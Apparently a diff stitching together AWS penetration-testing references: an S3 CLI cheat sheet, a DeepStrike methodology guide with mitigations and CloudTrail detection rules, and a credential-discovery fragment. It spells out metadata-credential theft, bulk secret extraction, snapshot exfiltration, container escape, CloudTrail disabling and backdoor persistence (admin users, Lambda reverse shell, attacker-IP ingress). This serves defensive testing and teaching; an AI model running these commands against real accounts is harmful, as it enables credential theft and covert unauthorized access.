@@ -1,3 +1,36 @@
+AWS Pentesting Cheat Sheet - S3
+Posted May 26, 2025
+By mRb0x
+1 min read
+Reference
+AWS-CLI-S3
+S3 Bucket Enumerating Cheat Sheet
+1. List Buckets in the Authenticated Account
+aws s3 ls
+2. Check if a Bucket Exists (No Auth)
+aws s3 ls s3://[bucket-name] --no-sign-request
+3. List Contents of a Public or Accessible Bucket
+aws s3 ls s3://[bucket-name]/[optional-path] --no-sign-request
+4. Download an Object
+aws s3 cp s3://[bucket-name]/[key] [local-file] --no-sign-request
+5. Upload a File (Test Write Access)
+Only works if write access is allowed.
+
+aws s3 cp test.txt s3://[bucket-name]/test.txt
+6. Enumerate Bucket Permissions (Authenticated)
+a. Get bucket policy
+aws s3api get-bucket-policy --bucket [bucket-name]
+b. Get bucket ACL (Access Control List)
+aws s3api get-bucket-acl --bucket [bucket-name]
+c. Get Public Access Block settings
+aws s3api get-bucket-public-access-block --bucket [bucket-name]
+d. Get CORS configuration (may hint at XSS vectors)
+aws s3api get-bucket-cors --bucket [bucket-name]
+7. List All Buckets & Objects (If Compromised Creds)
+aws s3api list-buckets
+aws s3api list-objects --bucket [bucket-name] --output table
+
+
 AWSome Pentesting Cheatsheet
 This guide was created to help pentesters learning more about AWS misconfigurations and ways to abuse them.
 It was created with my notes gathered with uncontable hours of study and annotations from various places
@@ -727,3 +760,1259 @@ Listing instances on the specified VPC ID
 aws ec2 describe-instances --filters "Name=vpc-id,Values=ID"
 Listing instances on the specified subnet
 aws ec2 describe-instances --filters "Name=subnet-id,Values=ID"
+
+
+Services
+Resources
+Company
+Pricing
+Login
+Contact Us
+October 21, 2025
+
+Updated: July 27, 2026
+
+AWS Penetration Testing Guide: Techniques & Methodology
+The complete 2025 guide for ethical hackers and security engineers performing AWS penetration testing from reconnaissance to privilege escalation and detection evasion.
+
+Ahmed M. Arafat
+
+Quick Reference for AWS Penetration Testers:
+
+No pre-approval needed for most AWS services (EC2, RDS, Lambda, API Gateway, etc.) as of 2019
+Prohibited: DoS/DDoS attacks, DNS zone walking, any request/port flooding
+Top attack vectors: Public S3 buckets, IMDSv1 exploitation, overprivileged IAM policies, exposed snapshots (RDS/EBS), leaked credentials
+Key techniques: Metadata service abuse (169.254.169.254), Lambda code extraction, Secrets Manager enumeration, container escape, 23 IAM privilege escalation paths
+Golden rule: 95% of cloud breaches are customer misconfigurations, not AWS vulnerabilities
+Essential tools: Pacu, ScoutSuite, Prowler, enumerate-iam, CloudFox
+Detection: Enable CloudTrail (all regions), GuardDuty, CloudWatch alerts for high-risk API calls
+Remember: Always get written authorization before testing
+AWS dominates the cloud infrastructure market with over 32% market share, hosting millions of organizations worldwide. As enterprises migrate critical workloads to AWS, understanding the security implications and attack surfaces becomes paramount. Unlike traditional infrastructure, AWS presents unique challenges: ephemeral compute instances, complex IAM policies, serverless architectures, and shared responsibility models.
+
+This comprehensive guide provides a structured methodology for conducting AWS cloud penetration testing from reconnaissance and enumeration to exploitation and privilege escalation designed for intermediate to senior security professionals.
+
+Why AWS Penetration Testing Matters
+Amazon Web Services (AWS) powers a significant portion of the internet's infrastructure. From startups to Fortune 500 companies, organizations trust AWS with their most sensitive data. For U.S. organizations testing AWS environments, this trust must be validated through rigorous security testing across IAM, S3, EC2, APIs, serverless workloads, and cloud network segmentation.
+
+Key reasons for AWS penetration testing:
+
+Misconfigured IAM policies grant excessive permissions (over-permissive wildcards, unrestricted actions)
+Public S3 buckets continue to be a major source of data breaches
+Leaked AWS credentials in public repositories, CI/CD pipelines, or container images
+IMDS exploitation allows lateral movement and privilege escalation
+Inadequate network segmentation in VPCs exposes internal services
+"95% of cloud security failures through 2025 will be the customer's fault, not the cloud provider's."
+— Gartner Cloud Security Report
+AWS Penetration Testing Policy
+Good news: As of 2019, AWS no longer requires pre-approval for penetration testing on most services.
+
+Permitted Services (No Prior Authorization Needed)
+Amazon EC2 instances, NAT Gateways, and Elastic Load Balancers
+Amazon RDS
+Amazon CloudFront
+Amazon Aurora
+Amazon API Gateways
+AWS Lambda and Lambda Edge functions
+Amazon Lightsail resources
+Amazon Elastic Beanstalk environments
+Prohibited Activities
+DNS zone walking via Amazon Route 53 Hosted Zones
+Denial of Service (DoS), Distributed Denial of Service (DDoS), or simulated DoS/DDoS
+Port flooding
+Protocol flooding
+Request flooding (login request flooding, API request flooding)
+Important: For activities involving prohibited items or services not listed above, submit a request through the AWS Vulnerability Reporting form.
+Pre-Engagement Rules and Scoping
+Key Scoping Considerations
+Account boundaries: Define which AWS accounts are in scope (production, staging, dev)
+For UK teams validating AWS cloud security, regional scope should specify the AWS regions in scope, such as us-east-1, eu-west-1, or any production regions supporting business-critical workloads.
+Service scope: List specific services (EC2, S3, Lambda, RDS, etc.)
+Network ranges: Document CIDR blocks and VPCs in scope
+Credentials: Define what level of access testing will begin with (black box, gray box, white box)
+Time windows: Specify testing hours and duration
+Emergency contacts: Maintain a contact list for incident escalation
+Testing Approaches:
+
+Black Box: External attacker perspective, no credentials provided
+Gray Box: Limited credentials (e.g., low-privilege IAM user)
+White Box: Full architectural documentation and admin access for comprehensive testing
+Read More: Best Cloud Penetration Testing Companies: 2026 Buyer’s Guide.
+
+Understanding AWS Architecture
+AWS resources follow a hierarchical organization model:
+
+AWS Organization (Root)
+├── Organizational Units (OUs)
+│   ├── Production Account
+│   ├── Staging Account
+│   └── Development Account
+└── Management Account (formerly Master Account)
+
+Each AWS Account contains:
+├── Regions (geographic areas)
+│   ├── Availability Zones (isolated data centers)
+│   │   ├── VPCs (Virtual Private Clouds)
+│   │   │   ├── Subnets (public/private)
+│   │   │   │   ├── EC2 Instances
+│   │   │   │   ├── RDS Databases
+│   │   │   │   └── Other Resources
+│   │   │   └── Security Groups & NACLs
+│   │   └── S3 Buckets (global namespace but regional)
+│   └── IAM (Identity & Access Management - global service)
+Key Security Services:
+
+IAM: Controls authentication and authorization
+CloudTrail: Logs all API calls for auditing
+GuardDuty: Threat detection service
+Security Hub: Centralized security findings
+Config: Tracks resource configurations and compliance
+AWS Attacks & Test Cases
+S3 Bucket Enumeration & Misconfiguration
+Goal: Discover publicly accessible S3 buckets and identify data exposure risks.
+
+Common naming patterns:
+
+# Company-based patterns
+companyname-backup
+companyname-logs
+companyname-prod
+companyname-dev
+companyname-assets
+companyname-data
+
+# Application-based
+app-name-uploads
+app-name-static
+webapp-media
+Enumeration techniques:
+
+bash
+# Check if bucket exists (DNS resolution)
+nslookup bucket-name.s3.amazonaws.com
+
+# Try to list bucket contents (anonymous)
+aws s3 ls s3://bucket-name --no-sign-request
+
+# Download accessible files
+aws s3 cp s3://bucket-name/file.txt . --no-sign-request
+
+# Sync entire bucket (if accessible)
+aws s3 sync s3://bucket-name ./local-dir --no-sign-request
+Check bucket ACL and policies:
+
+bash
+# Get bucket ACL
+aws s3api get-bucket-acl --bucket bucket-name
+
+# Get bucket policy
+aws s3api get-bucket-policy --bucket bucket-name
+
+# Check public access block configuration
+aws s3api get-public-access-block --bucket bucket-name
+Common misconfigurations:
+
+public-read or public-read-write ACLs
+Overly permissive bucket policies (Principal: "*")
+Disabled public access block settings
+Server-side encryption not enabled
+Versioning disabled (inability to recover from ransomware)
+Mitigation:
+
+Enable S3 Block Public Access at account and bucket level
+Implement least-privilege bucket policies
+Enable S3 versioning and MFA Delete
+Use S3 Access Points for application-specific access
+Enable CloudTrail S3 data events logging
+Implement S3 Object Lock for WORM compliance
+IAM User Enumeration & Credential Harvesting
+Goal: Discover valid IAM principals and harvest credentials from various sources.
+
+Credential sources:
+
+bash
+# Check common locations
+~/.aws/credentials
+~/.aws/config
+.env files
+config.json
+Environment variables (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)
+CI/CD configuration files (.gitlab-ci.yml, .github/workflows/*)
+Container images (Docker layers)
+Source code repositories
+Instance user data scripts
+Enumerate IAM user existence:
+
+bash
+# Attempt to get user info (works even with no permissions)
+aws iam get-user --user-name target-user
+
+# Enumerate current identity
+aws sts get-caller-identity
+
+# List access keys for current user
+aws iam list-access-keys
+Test credential permissions:
+
+bash
+# Quick permission check
+aws iam get-account-authorization-details --output json
+
+# Enumerate accessible S3 buckets
+aws s3 ls
+
+# List EC2 instances
+aws ec2 describe-instances
+
+# List Lambda functions
+aws lambda list-functions
+
+# Enumerate IAM roles
+aws iam list-roles
+Privilege enumeration script:
+
+bash
+#!/bin/bash
+# Quick AWS permission checker
+
+echo "[+] Checking caller identity..."
+aws sts get-caller-identity
+
+echo "[+] Attempting to list S3 buckets..."
+aws s3 ls 2>/dev/null && echo "✓ S3 ListAllMyBuckets" || echo "✗ S3 access denied"
+
+echo "[+] Attempting to list EC2 instances..."
+aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name]' --output text 2>/dev/null && echo "✓ EC2 Describe" || echo "✗ EC2 access denied"
+
+echo "[+] Attempting to list IAM users..."
+aws iam list-users 2>/dev/null && echo "✓ IAM List Users" || echo "✗ IAM access denied"
+
+echo "[+] Attempting to list Lambda functions..."
+aws lambda list-functions 2>/dev/null && echo "✓ Lambda List" || echo "✗ Lambda access denied"
+Mitigation:
+
+Enforce MFA for all IAM users
+Implement credential rotation policies (90 days max)
+Use IAM roles instead of long-term credentials
+Scan repositories for exposed credentials (git-secrets, truffleHog)
+Implement least-privilege IAM policies
+Enable CloudTrail for credential usage monitoring
+EC2 Instance Metadata Service (IMDS) Exploitation
+Goal: Extract IAM role credentials from EC2 instance metadata endpoint.
+
+IMDSv1 (vulnerable to SSRF):
+
+bash
+# Get IAM role name
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Extract credentials
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
+
+# Get instance identity document
+curl http://169.254.169.254/latest/dynamic/instance-identity/document
+
+# Get user data (may contain secrets)
+curl http://169.254.169.254/latest/user-data
+IMDSv2 (requires session token):
+
+bash
+# Get session token (hop limit = 1 prevents SSRF)
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+
+# Use token for subsequent requests
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
+SSRF to IMDS exploitation:
+
+# Example SSRF vulnerable endpoint
+https://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# If IMDSv1 is enabled, this will expose credentials
+Use extracted credentials:
+
+bash
+export AWS_ACCESS_KEY_ID=ASIA...
+export AWS_SECRET_ACCESS_KEY=...
+export AWS_SESSION_TOKEN=...
+
+aws sts get-caller-identity
+aws s3 ls
+Mitigation:
+
+Enforce IMDSv2 (disable IMDSv1): aws ec2 modify-instance-metadata-options --instance-id i-xxx --http-tokens required
+Set hop limit to 1: -http-put-response-hop-limit 1
+Use VPC endpoints to prevent SSRF to IMDS
+Implement network-level controls (iptables rules)
+Monitor CloudTrail for unusual API calls from EC2 instances
+Lambda Function Enumeration & Code Extraction
+Goal: Discover Lambda functions and extract source code that may contain hardcoded secrets.
+
+Enumeration:
+
+bash
+# List all Lambda functions
+aws lambda list-functions --output table
+
+# Get function configuration
+aws lambda get-function-configuration --function-name function-name
+
+# Get function code location
+aws lambda get-function --function-name function-name
+
+# Download function code
+aws lambda get-function --function-name function-name --query 'Code.Location' --output text | xargs curl -o function.zip
+
+# Extract and review
+unzip function.zip
+grep -r "password\\|secret\\|key\\|token" .
+Check environment variables:
+
+bash
+# Extract environment variables (may contain secrets)
+aws lambda get-function-configuration --function-name function-name --query 'Environment.Variables'
+Review Lambda execution role:
+
+bash
+# Get execution role ARN
+ROLE_ARN=$(aws lambda get-function-configuration --function-name function-name --query 'Role' --output text)
+
+# Get role name from ARN
+ROLE_NAME=$(echo $ROLE_ARN | awk -F'/' '{print $NF}')
+
+# Get attached policies
+aws iam list-attached-role-policies --role-name $ROLE_NAME
+
+# Get inline policies
+aws iam list-role-policies --role-name $ROLE_NAME
+Test Lambda invocation:
+
+# Invoke function (if you have permissions)
+aws lambda invoke --function-name function-name --payload '{"key":"value"}' output.txt
+
+# Review output
+cat output.txt
+Mitigation:
+
+Store secrets in AWS Secrets Manager or Parameter Store, not environment variables
+Implement least-privilege execution roles
+Enable Lambda function versioning and aliases
+Use Lambda layers for shared dependencies
+Enable CloudTrail for Lambda API logging
+Implement VPC Lambda for network isolation
+RDS Snapshot Enumeration & Exfiltration
+Goal: Identify publicly shared or accessible RDS snapshots containing sensitive data.
+
+Enumeration:
+
+bash
+# List all RDS snapshots
+aws rds describe-db-snapshots --output table
+
+# Check for public snapshots
+aws rds describe-db-snapshots --query 'DBSnapshots[?PubliclyAccessible==`true`]'
+
+# Describe specific snapshot
+aws rds describe-db-snapshot-attributes --db-snapshot-identifier snapshot-name
+Check snapshot sharing:
+
+bash
+# Get snapshot attributes
+aws rds describe-db-snapshot-attributes --db-snapshot-identifier snapshot-id
+
+# Look for "all" in restore attribute (public)
+Exfiltration technique:
+
+bash
+# Copy snapshot to your account (if shared with you or public)
+aws rds copy-db-snapshot \\
+  --source-db-snapshot-identifier arn:aws:rds:region:account:snapshot:snapshot-name \\
+  --target-db-snapshot-identifier my-copy
+
+# Restore to RDS instance
+aws rds restore-db-instance-from-db-snapshot \\
+  --db-instance-identifier restored-db \\
+  --db-snapshot-identifier my-copy
+
+# Connect and extract data
+mysql -h restored-db.xxxx.rds.amazonaws.com -u admin -p
+Mitigation:
+
+Never make RDS snapshots public
+Implement automated snapshot encryption
+Use AWS Organizations SCPs to prevent public snapshots
+Regularly audit snapshot sharing permissions
+Enable automated backups with encryption
+Use IAM policies to restrict snapshot operations
+EBS Snapshot Sharing & Volume Cloning
+Goal: Identify publicly shared EBS snapshots and clone volumes to access data.
+
+Enumeration:
+
+bash
+# List all EBS snapshots owned by you
+aws ec2 describe-snapshots --owner-ids self
+
+# Search for public snapshots (specific region)
+aws ec2 describe-snapshots --restorable-by-user-ids all --region us-east-1
+
+# Describe specific snapshot
+aws ec2 describe-snapshot-attribute --snapshot-id snap-xxx --attribute createVolumePermission
+Clone and mount snapshot:
+
+bash
+# Create volume from snapshot
+aws ec2 create-volume \\
+  --snapshot-id snap-xxx \\
+  --availability-zone us-east-1a \\
+  --volume-type gp3
+
+# Attach to your EC2 instance
+aws ec2 attach-volume \\
+  --volume-id vol-xxx \\
+  --instance-id i-xxx \\
+  --device /dev/sdf
+
+# SSH to instance and mount
+sudo mkdir /mnt/target-volume
+sudo mount /dev/xvdf1 /mnt/target-volume
+cd /mnt/target-volume
+
+# Extract credentials or sensitive data
+grep -r "password" .
+find . -name "*.pem"
+find . -name ".env"
+Mitigation:
+
+Encrypt all EBS volumes and snapshots
+Never share snapshots publicly
+Implement IAM policies restricting snapshot creation/sharing
+Use AWS Config rules to detect public snapshots
+Regular audits of snapshot permissions
+Enable CloudTrail logging for snapshot operations
+CloudFormation Stack Enumeration
+Goal: Extract sensitive information from CloudFormation templates and parameters.
+
+Enumeration:
+
+bash
+# List all CloudFormation stacks
+aws cloudformation list-stacks --output table
+
+# Describe specific stack
+aws cloudformation describe-stacks --stack-name stack-name
+
+# Get stack resources
+aws cloudformation describe-stack-resources --stack-name stack-name
+
+# Get template body (may contain hardcoded secrets)
+aws cloudformation get-template --stack-name stack-name --query 'TemplateBody' --output text
+
+# Extract parameters (often contains secrets)
+aws cloudformation describe-stacks --stack-name stack-name --query 'Stacks[0].Parameters'
+Look for sensitive data:
+
+bash
+# Download template
+aws cloudformation get-template --stack-name stack-name --query 'TemplateBody' --output text > template.yaml
+
+# Search for secrets
+grep -i "password\\|secret\\|key\\|token" template.yaml
+Mitigation:
+
+Use AWS Secrets Manager or Parameter Store for sensitive values
+Use NoEcho: true for sensitive parameters
+Implement drift detection
+Enable stack termination protection
+Use CloudFormation StackSets for multi-account deployments
+Review templates before deployment
+Secrets Manager & Parameter Store Extraction
+Goal: Extract secrets from AWS Secrets Manager and Systems Manager Parameter Store.
+
+Secrets Manager:
+
+bash
+# List all secrets
+aws secretsmanager list-secrets
+
+# Get secret value
+aws secretsmanager get-secret-value --secret-id secret-name
+
+# Batch extraction
+for secret in $(aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text); do
+  echo "=== $secret ==="
+  aws secretsmanager get-secret-value --secret-id $secret --query 'SecretString' --output text
+done
+Parameter Store:
+
+bash
+# List all parameters
+aws ssm describe-parameters
+
+# Get parameter value (plain text)
+aws ssm get-parameter --name parameter-name --with-decryption
+
+# Get multiple parameters
+aws ssm get-parameters --names param1 param2 param3 --with-decryption
+
+# Get parameters by path
+aws ssm get-parameters-by-path --path /production/ --recursive --with-decryption
+Bulk extraction script:
+
+bash
+#!/bin/bash
+# Extract all SSM parameters
+
+for param in $(aws ssm describe-parameters --query 'Parameters[*].Name' --output text); do
+  echo "=== $param ==="
+  aws ssm get-parameter --name "$param" --with-decryption --query 'Parameter.Value' --output text
+  echo ""
+done
+Mitigation:
+
+Implement least-privilege IAM policies for secret access
+Enable automatic secret rotation
+Use resource-based policies on secrets
+Enable CloudTrail logging for GetSecretValue calls
+Use VPC endpoints for Secrets Manager/SSM
+Implement secret access alerts (CloudWatch + SNS)
+API Gateway Misconfiguration
+Goal: Identify exposed or misconfigured API Gateway endpoints.
+
+Enumeration:
+
+bash
+# List all APIs
+aws apigateway get-rest-apis
+
+# Get API details
+aws apigateway get-rest-api --rest-api-id api-id
+
+# List resources
+aws apigateway get-resources --rest-api-id api-id
+
+# Get method configuration
+aws apigateway get-method --rest-api-id api-id --resource-id resource-id --http-method GET
+Common API patterns:
+
+bash
+https://{api-id}.execute-api.{region}.amazonaws.com/{stage}/{resource}
+Test authentication:
+
+bash
+# Test without authentication
+curl https://api-id.execute-api.us-east-1.amazonaws.com/prod/endpoint
+
+# Test with API key
+curl -H "x-api-key: key" <https://api-id.execute-api.us-east-1.amazonaws.com/prod/endpoint
+
+# Test authorization bypass
+curl -H "Authorization: Bearer fake-token" https://api-id.execute-api.us-east-1.amazonaws.com/prod/endpoint
+Common misconfigurations:
+
+Missing authorization on methods
+API keys without usage plans or throttling
+CORS misconfiguration allowing any origin
+Excessive CloudWatch logging (sensitive data in logs)
+No request validation
+Mitigation:
+
+Implement proper authorization (Lambda authorizers, IAM, Cognito)
+Enable API key requirements with usage plans
+Configure restrictive CORS policies
+Implement request validation
+Enable throttling and rate limiting
+Use AWS WAF for API protection
+ECS/EKS Container Escape & Privilege Escalation
+Goal: Escape from container and access underlying host or cluster credentials.
+
+ECS Task Metadata Endpoint:
+
+bash
+# Get task metadata (ECS Fargate/EC2)
+curl http://169.254.170.2/v2/metadata
+
+# Get task IAM credentials
+curl http://169.254.170.2/v2/credentials/ROLE-GUID
+
+# Extract credentials
+export AWS_ACCESS_KEY_ID=...
+export AWS_SECRET_ACCESS_KEY=...
+export AWS_SESSION_TOKEN=...
+EKS Privilege Escalation:
+
+bash
+# Check service account
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+# List pods
+kubectl get pods --all-namespaces
+
+# Check for privileged containers
+kubectl get pods -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true)'
+
+# Attempt to create privileged pod
+kubectl run attacker --image=ubuntu --privileged
+Container escape techniques:
+
+bash
+# Check if privileged
+cat /proc/1/status | grep CapEff
+
+# Check for Docker socket mount
+ls -la /var/run/docker.sock
+
+# If socket is mounted, escape to host
+docker run -v /:/host -it ubuntu chroot /host /bin/bash
+Mitigation:
+
+Never run containers in privileged mode
+Use ECS/EKS task IAM roles with least privilege
+Implement Pod Security Policies (PSP) or Pod Security Standards
+Don't mount Docker socket into containers
+Use Fargate for better isolation
+Implement runtime security monitoring (Falco, AWS GuardDuty EKS)
+Regular security scanning of container images
+CloudTrail Disable/Evasion Techniques
+Goal: Understand how attackers disable or evade CloudTrail logging.
+
+Disable CloudTrail:
+
+bash
+# Stop logging (requires significant permissions)
+aws cloudtrail stop-logging --name trail-name
+
+# Delete trail
+aws cloudtrail delete-trail --name trail-name
+
+# Update trail to log to attacker-controlled S3
+aws cloudtrail update-trail --name trail-name --s3-bucket-name attacker-bucket
+Evasion techniques:
+
+bash
+# Use access keys without MFA (if MFA not enforced)
+aws sts get-session-token
+
+# Operate from services with limited logging (e.g., certain Lambda regions)
+# Use event selectors to exclude certain resource types
+# Perform actions in regions without CloudTrail
+
+# Check CloudTrail status
+aws cloudtrail get-trail-status --name trail-name
+
+# Check event selectors
+aws cloudtrail get-event-selectors --trail-name trail-name
+Detection indicators:
+
+StopLogging API calls
+DeleteTrail API calls
+UpdateTrail modifications
+PutEventSelectors changes
+Long gaps in CloudTrail logs
+Mitigation:
+
+Enable CloudTrail in all regions (organization trail)
+Enable log file validation
+Send logs to immutable S3 bucket with Object Lock
+Use separate AWS account for log aggregation
+Implement CloudWatch Events for StopLogging alerts
+Enable S3 MFA Delete on log bucket
+Use AWS Control Tower for multi-account governance
+IAM Role Assumption & Privilege Escalation
+Goal: Identify and exploit overly permissive IAM role trust policies and permissions.
+
+Enumerate assumable roles:
+
+bash
+# List all roles
+aws iam list-roles
+
+# Get role trust policy
+aws iam get-role --role-name role-name --query 'Role.AssumeRolePolicyDocument'
+
+# Look for roles with permissive trust policies
+aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.Service==`lambda.amazonaws.com`]]'
+Common privilege escalation paths:
+
+bash
+# 1. iam:PassRole + service execution
+aws lambda create-function --function-name backdoor --role arn:aws:iam::account:role/AdminRole ...
+
+# 2. iam:CreateAccessKey on other users
+aws iam create-access-key --user-name admin-user
+
+# 3. iam:AttachUserPolicy
+aws iam attach-user-policy --user-name current-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+# 4. iam:UpdateAssumeRolePolicy
+aws iam update-assume-role-policy --role-name target-role --policy-document file://trust.json
+
+# 5. iam:PutUserPolicy (inline policy)
+aws iam put-user-policy --user-name current-user --policy-name escalate --policy-document file://admin.json
+
+# 6. sts:AssumeRole
+aws sts assume-role --role-arn arn:aws:iam::account:role/AdminRole --role-session-name test
+23 known AWS privilege escalation techniques:
+
+iam:CreateAccessKey
+iam:CreateLoginProfile
+iam:UpdateLoginProfile
+iam:AttachUserPolicy
+iam:AttachGroupPolicy
+iam:AttachRolePolicy
+iam:PutUserPolicy
+iam:PutGroupPolicy
+iam:PutRolePolicy
+iam:AddUserToGroup
+iam:UpdateAssumeRolePolicy
+iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
+iam:PassRole + glue:CreateDevEndpoint
+iam:PassRole + cloudformation:CreateStack
+iam:PassRole + datapipeline:CreatePipeline
+ec2:RunInstances + iam:PassRole
+lambda:UpdateFunctionCode
+lambda:UpdateFunctionConfiguration
+glue:UpdateDevEndpoint
+dynamodb:PutItem (on identity-based tables)
+dynamodb:CreateBackup + dynamodb:RestoreTableFromBackup
+iam:CreatePolicyVersion
+iam:SetDefaultPolicyVersion
+Mitigation:
+
+Implement least-privilege IAM policies
+Use permission boundaries
+Enable IAM Access Analyzer
+Regular review of IAM policies with Access Advisor
+Use AWS Organizations SCPs to prevent privilege escalation
+Implement MFA for sensitive operations
+Monitor CloudTrail for privilege escalation indicators
+Cognito User Pool Enumeration
+Goal: Enumerate Cognito users and extract tokens.
+
+Enumerate user pools:
+
+bash
+# List user pools
+aws cognito-idp list-user-pools --max-results 60
+
+# Get user pool details
+aws cognito-idp describe-user-pool --user-pool-id us-east-1_XXXXX
+
+# List users (requires admin privileges)
+aws cognito-idp list-users --user-pool-id us-east-1_XXXXX
+
+# Get user attributes
+aws cognito-idp admin-get-user --user-pool-id us-east-1_XXXXX --username user@example.com
+User enumeration via signup:
+
+# Attempt signup with existing email
+aws cognito-idp sign-up \\
+  --client-id client-id \\
+  --username test@example.com \\
+  --password TempPass123!
+
+# Error message reveals if user exists
+Authentication:
+
+bash
+# Initiate auth
+aws cognito-idp initiate-auth \\
+  --auth-flow USER_PASSWORD_AUTH \\
+  --client-id client-id \\
+  --auth-parameters USERNAME=user@example.com,PASSWORD=password
+
+# Get tokens (IdToken, AccessToken, RefreshToken)
+Mitigation:
+
+Implement rate limiting on authentication endpoints
+Use Cognito advanced security features
+Enable MFA for sensitive user pools
+Don't reveal user existence in error messages
+Implement account lockout policies
+Monitor for enumeration attempts
+ElasticBeanstalk Environment Variable Extraction
+Goal: Extract environment variables from Elastic Beanstalk that may contain secrets.
+
+Enumeration:
+
+bash
+# List all environments
+aws elasticbeanstalk describe-environments
+
+# Get environment configuration
+aws elasticbeanstalk describe-configuration-settings \\
+  --application-name app-name \\
+  --environment-name env-name
+
+# Extract environment variables
+aws elasticbeanstalk describe-configuration-settings \\
+  --application-name app-name \\
+  --environment-name env-name \\
+  --query 'ConfigurationSettings[0].OptionSettings[?Namespace==`aws:elasticbeanstalk:application:environment`]'
+Alternative via EC2:
+
+bash
+# SSH to Beanstalk EC2 instance
+# Check environment variables
+cat /opt/elasticbeanstalk/deployment/env
+printenv
+Mitigation:
+
+Store secrets in Secrets Manager, not environment variables
+Use IAM instance profiles for AWS credentials
+Implement least-privilege IAM policies
+Encrypt configuration data
+Regular rotation of secrets
+AWS Privilege Escalation Paths
+Common Escalation Vectors
+iam:AttachUserPolicy	Attach AdministratorAccess to current user
+iam:CreateAccessKey	Create access key for privileged user
+iam:PassRole + lambda:CreateFunction	Pass admin role to Lambda, invoke to escalate
+iam:PutUserPolicy	Add inline admin policy to current user
+iam:UpdateAssumeRolePolicy	Modify role trust to allow assumption
+sts:AssumeRole + overly permissive trust	Assume higher-privilege role
+ec2:RunInstances + iam:PassRole	Launch instance with privileged role
+lambda:UpdateFunctionCode	Modify existing Lambda with privileged role
+Persistence Mechanisms
+Backdoor Techniques
+1. Create new IAM user:
+
+bash
+aws iam create-user --user-name backup-admin
+aws iam create-access-key --user-name backup-admin
+aws iam attach-user-policy --user-name backup-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+2. Add SSH key to EC2:
+
+# Add public key to authorized_keys via user data or run command
+aws ec2 modify-instance-attribute --instance-id i-xxx --user-data file://userdata.sh
+3. Create Lambda backdoor:
+
+bash
+# Deploy Lambda with reverse shell or credential exfiltration
+aws lambda create-function \\
+  --function-name system-health-check \\
+  --runtime python3.9 \\
+  --role arn:aws:iam::account:role/AdminRole \\
+  --handler index.handler \\
+  --zip-file fileb://backdoor.zip
+4. Modify security group:
+
+bash
+# Open SSH from attacker IP
+aws ec2 authorize-security-group-ingress \\
+  --group-id sg-xxx \\
+  --protocol tcp \\
+  --port 22 \\
+  --cidr attacker-ip/32
+5. Create IAM role with external trust:
+
+bash
+# Create role that can be assumed from attacker account
+aws iam create-role --role-name ExternalAdmin --assume-role-policy-document file://external-trust.json
+aws iam attach-role-policy --role-name ExternalAdmin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+Detection and Monitoring
+Key CloudTrail Events to Monitor
+bash
+// High-severity events
+- ConsoleLogin (especially from unusual locations)
+- CreateAccessKey (especially for other users)
+- DeleteTrail / StopLogging
+- PutBucketPolicy (making buckets public)
+- ModifySnapshotAttribute (making snapshots public)
+- AuthorizeSecurityGroupIngress (0.0.0.0/0)
+- AssumeRole (especially cross-account)
+- AttachUserPolicy / AttachRolePolicy (privilege escalation)
+- GetSecretValue (secret access)
+- RunInstances (especially with privileged roles)
+CloudWatch Alert Examples
+Detect public S3 bucket creation:
+
+json
+{
+  "source": ["aws.s3"],
+  "detail-type": ["AWS API Call via CloudTrail"],
+  "detail": {
+    "eventName": ["PutBucketAcl", "PutBucketPolicy"],
+    "requestParameters": {
+      "accessControlList": {
+        "grants": {
+          "grantee": {
+            "URI": ["http://acs.amazonaws.com/groups/global/AllUsers"]
+          }
+        }
+      }
+    }
+  }
+}
+Detect CloudTrail deletion:
+
+json
+{
+  "source": ["aws.cloudtrail"],
+  "detail-type": ["AWS API Call via CloudTrail"],
+  "detail": {
+    "eventName": ["DeleteTrail", "StopLogging", "UpdateTrail"]
+  }
+}
+GuardDuty Findings
+Enable GuardDuty for automatic threat detection:
+
+Credential exfiltration
+Cryptocurrency mining
+Unusual API call patterns
+Compromised EC2 instances
+Reconnaissance activity
+Expert Sources Referenced
+AWS Penetration Testing Policy
+HackTricks Cloud - AWS Security
+Rhino Security Labs - AWS IAM Privilege Escalation
+AWS Security Blog
+Christophe Tafani-Dereeper - AWS Security Research
+Let's hack you before real hackers do
+Stay secure with DeepStrike penetration testing services. Reach out for a quote or customized technical proposal today
+
+Contact Us
+DeepStrike LLC
+United States
+DeepStrike LLC
+
+131 Continental Dr Suite 305 Newark, DE 19713
++1 (585) 523 2190
+
+
+UAE
+IFZA Business Park, DDP, Dubai Silicon Oasis, Dubai, United Arab Emirates Premises Number - 40823 - 001
+
+CBLS No: 12285963
+
+Licenses number: 40823
+
+Services
+Penetration Testing
+Web Application Penetration Testing
+Mobile Application Penetration Testing
+Cloud Penetration Testing
+Continous Penetration Testing
+Red Teaming as a Service
+Company
+About
+Blog
+Careers
+Contact
+Resources
+Pricing
+Customers
+Philosophy
+Partners
+Production Testing Policy
+Legal/Policy Links
+Terms of Service
+Privacy Policy
+
+© 2025 DeepStrike, LLC
+
+Phase 1: Reconnaissance and Credential Discovery
+1.1 Identifying Exposed AWS Credentials
+Before touching any AWS API, you need credentials. The first step is reconnaissance to identify leaked or exposed keys.
+
+Search for exposed credentials in GitHub repositories using tools like truffleHog or git-secrets:
+
+trufflehog git https://github.com/target-org/target-repo --only-verified
+Copy Code
+
+You can also grep for hardcoded keys in cloned repositories:
+
+grep -rE "AKIA[0-9A-Z]{16}" ./target-repo/
+grep -rE "aws_secret_access_key\s*=\s*[A-Za-z0-9/+=]{40}" ./target-repo/
+Copy Code
+
